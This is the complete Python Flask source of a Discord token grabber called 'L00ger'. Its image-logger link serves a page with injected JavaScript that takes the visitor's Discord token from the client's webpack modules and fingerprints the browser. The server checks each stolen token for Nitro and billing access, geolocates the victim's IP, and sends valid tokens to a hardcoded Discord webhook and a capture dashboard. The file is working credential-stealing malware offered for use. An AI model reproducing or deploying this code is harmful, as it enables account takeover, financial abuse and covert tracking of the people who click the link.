#!/usr/bin/env python3
from flask import Flask, request, Response, jsonify, render_template_string
import json
import os
import re
import time
from datetime import datetime
import requests
import base64
import threading

app = Flask(__name__)

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1478242180786163813/Qtd2uN5hvVQ-oh50nyc2lg6AXy7oaEp9sdJxaDIJP3Tac7gPS1qYoJpl2_TXv3d-aYqy" # Add your Discord Webhook URL here
ADMIN_PASSWORD = "admin" # Simple password for dashboard
LOG_DIR = 'logs'
os.makedirs(LOG_DIR, exist_ok=True)

# 1x1 transparent PNG (base64 encoded)
PIXEL_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
)

def log_to_json(data):
    """Save captured data to a JSON file for the dashboard"""
    filepath = os.path.join(LOG_DIR, 'captured_data.json')
    current_logs = []
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r') as f:
                current_logs = json.load(f)
        except:
            current_logs = []
    
    current_logs.append(data)
    with open(filepath, 'w') as f:
        json.dump(current_logs, f, indent=4)

def send_webhook(data):
    """Send notification to Discord Webhook"""
    if not WEBHOOK_URL:
        return

    user = data.get('discord_user', {})
    username = user.get('username', 'Unknown')
    discrim = user.get('discriminator', '0000')
    user_id = user.get('id', 'N/A')
    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else None
    
    token = data.get('discord_token', 'N/A')
    ip = data.get('ip', 'N/A')
    geo = data.get('geo', {})
    
    embed = {
        "title": "🎯 New Hit Captured!",
        "color": 0x5865F2,
        "fields": [
            {"name": "👤 User", "value": f"**{username}#{discrim}** (`{user_id}`)", "inline": True},
            {"name": "🌐 IP", "value": f"`{ip}` ({geo.get('country', 'Unknown')})", "inline": True},
            {"name": "🎟️ Nitro", "value": f"{'✅' if data.get('has_nitro') else '❌'}", "inline": True},
            {"name": "💳 Billing", "value": f"{'✅' if data.get('has_billing') else '❌'}", "inline": True},
            {"name": "🔑 Token", "value": f"```\n{token}\n```", "inline": False}
        ],
        "footer": {"text": f"Captured at {data.get('timestamp')}"}
    }
    
    if avatar:
        embed["thumbnail"] = {"url": avatar}

    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except:
        pass

def get_geolocation(ip):
    """Get IP info using ip-api.com"""
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,isp,org,as,mobile,proxy,hosting', timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return {}

def validate_discord_token(token):
    """Validate and fetch detailed user info"""
    results = {'valid': False, 'user': None, 'nitro': False, 'billing': False}
    headers = {'Authorization': token}
    try:
        # Base User Info
        user_resp = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if user_resp.status_code == 200:
            results['valid'] = True
            results['user'] = user_resp.json()
            
            # Check Nitro
            nitro_resp = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
            results['nitro'] = len(nitro_resp.json()) > 0 if nitro_resp.status_code == 200 else False
            
            # Check Billing
            billing_resp = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=5)
            results['billing'] = len(billing_resp.json()) > 0 if billing_resp.status_code == 200 else False
    except:
        pass
    return results

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'unknown'

@app.route('/logger.png', methods=['GET'])
def image_logger():
    # Anti-Bot: Simple User-Agent check
    ua = request.headers.get('User-Agent', '').lower()
    if any(bot in ua for bot in ['bot', 'crawl', 'spider', 'slurp', 'mediapartners']):
        return Response(PIXEL_PNG, mimetype='image/png')

    js_payload = '''
<script>
(async()=>{
    const d={
        userAgent:navigator.userAgent,
        screen:`${screen.width}x${screen.height}`,
        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.language,
        hw:navigator.hardwareConcurrency,
        mem:navigator.deviceMemory,
        ref:document.referrer,
        url:location.href
    };
    
    function gT(){
        try{
            const r=window.webpackChunkdiscord_app.push([[Math.random()],{},r=>r]);
            window.webpackChunkdiscord_app.pop();
            for(let m of Object.values(r.c)){
                if(m?.exports?.default?.getToken)return m.exports.default.getToken();
            }
        }catch{}
        return null;
    }
    
    d.token = gT();
    
    fetch("/grab",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(d)
    });
})();
</script>'''
    
    html = f'<html><body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><img src="https://imgs.search.brave.com/B00Bfn1lTaKo5VfpF5-9V3A2IRhj8qT8yddHLKe_u7c/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9tZWRp/YS5nZXR0eWltYWdl/cy5jb20vaWQvNjU4/Nzg2OTMwL3Bob3Rv/L2xvcy1hbmdlbGVz/LWNhLXNlYW4tcC1k/aWRkeS1jb21icy1h/bmQtNTAtY2VudC1h/dHRlbmQtY2xpdmUt/ZGF2aXMtcHJlLWdy/YW1teS1hd2FyZHMt/cGFydHktYXQuanBn/P3M9NjEyeDYxMiZ3/PTAmaz0yMCZjPTVP/UlBPZjRxd011SWcx/eC11eHlkTVFQcllZ/NHMtdEhsY0ZSUmJS/NWQ2UWM9" style="max-width:100%;max-height:100%">{js_payload}</body></html>'
    return Response(html, mimetype='text/html')

@app.route('/grab', methods=['POST'])
def grab_handler():
    data = request.get_json() or {}
    ip = get_client_ip()
    
    # Enrichment
    token = data.get('token')
    validation = validate_discord_token(token) if token else {'valid': False}
    geo = get_geolocation(ip)
    
    victim = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': ip,
        'geo': geo,
        'ua': data.get('userAgent'),
        'discord_token': token,
        'token_valid': validation.get('valid'),
        'discord_user': validation.get('user'),
        'has_nitro': validation.get('nitro'),
        'has_billing': validation.get('billing'),
        'fingerprint': {
            'screen': data.get('screen'),
            'timezone': data.get('timezone'),
            'lang': data.get('lang'),
            'hw': data.get('hw'),
            'mem': data.get('mem')
        }
    }
    
    log_to_json(victim)
    
    if victim['token_valid']:
        threading.Thread(target=send_webhook, args=(victim,)).start()
        
    return jsonify({'status': 'ok'})

@app.route('/dashboard')
def dashboard():
    pwd = request.args.get('p')
    if pwd != ADMIN_PASSWORD:
        return "Unauthorized", 401
        
    filepath = os.path.join(LOG_DIR, 'captured_data.json')
    logs = []
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            logs = json.load(f)
            
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>L00ger Dashboard</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f13; color: #eee; margin: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1a1a24; border-radius: 8px; overflow: hidden; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
            th { background: #5865F2; color: white; }
            tr:hover { background: #252535; }
            .valid { color: #43b581; font-weight: bold; }
            .invalid { color: #f04747; }
            .token { font-family: monospace; font-size: 0.85em; background: #000; padding: 4px; border-radius: 4px; }
            .tag { padding: 2px 6px; border-radius: 4px; font-size: 0.8em; margin-right: 4px; }
            .nitro { background: #ff73fa; color: #fff; }
            .billing { background: #faa61a; color: #fff; }
        </style>
    </head>
    <body>
        <h1>🎯 L00ger - Capture Dashboard</h1>
        <table>
            <tr>
                <th>Time</th>
                <th>IP / Location</th>
                <th>User</th>
                <th>Status</th>
                <th>Token</th>
            </tr>
            {% for entry in logs[::-1] %}
            <tr>
                <td>{{ entry.timestamp }}</td>
                <td>
                    {{ entry.ip }}<br>
                    <small>{{ entry.geo.city }}, {{ entry.geo.country }} ({{ entry.geo.isp }})</small>
                </td>
                <td>
                    {% if entry.discord_user %}
                        <strong>{{ entry.discord_user.username }}#{{ entry.discord_user.discriminator }}</strong><br>
                        <small>{{ entry.discord_user.id }}</small>
                    {% else %}
                        N/A
                    {% endif %}
                </td>
                <td>
                    <span class="{{ 'valid' if entry.token_valid else 'invalid' }}">
                        {{ 'VALID' if entry.token_valid else 'INVALID/NONE' }}
                    </span><br>
                    {% if entry.has_nitro %}<span class="tag nitro">Nitro</span>{% endif %}
                    {% if entry.has_billing %}<span class="tag billing">Billing</span>{% endif %}
                </td>
                <td class="token">{{ entry.discord_token or 'N/A' }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    '''
    return render_template_string(html, logs=logs)

if __name__ == '__main__':
    print("🚀 L00ger Enhanced running on http://0.0.0.0:5000")
    print("🔑 Dashboard: http://localhost:5000/dashboard?p=admin")
    app.run(host='0.0.0.0', port=5000, debug=False)
